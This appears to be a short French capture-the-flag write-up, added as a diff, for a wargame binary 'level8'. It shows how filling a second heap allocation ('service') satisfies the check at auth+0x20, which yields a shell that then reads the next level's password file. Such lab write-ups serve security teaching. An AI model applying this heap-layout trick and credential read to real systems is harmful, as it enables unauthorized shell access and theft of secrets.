@@ -1,0 +1,22 @@
+# Apres review du code, on voit que que pour acceder a system("/bin/sh") il faut que la zone memoire auth + 0x20 soit different de 0.
+# On ne peux pas ecrire plus de 30 caractere avec la commande auth (pour essayer d'ecrire auth + 32) car c'est protege.
+
+# On fait des tests
+
+./level8
+> auth ok
+0x804a008, (nil)
+> service ok
+0x804a008, 0x804a018
+
+# Donc auth + 0x20 = 0x804a028.
+# On voit que c'est apres le malloc de 'service'.
+# Il suffit donc de mettre quelques caractere en plus dans service pour debloquer le shell
+
+./level8
+> auth ok
+0x804a008, (nil)
+> service aaaaaaaaaaaaaaa
+0x804a008, 0x804a018
+> login
+$ cat /home/user/level9/.pass
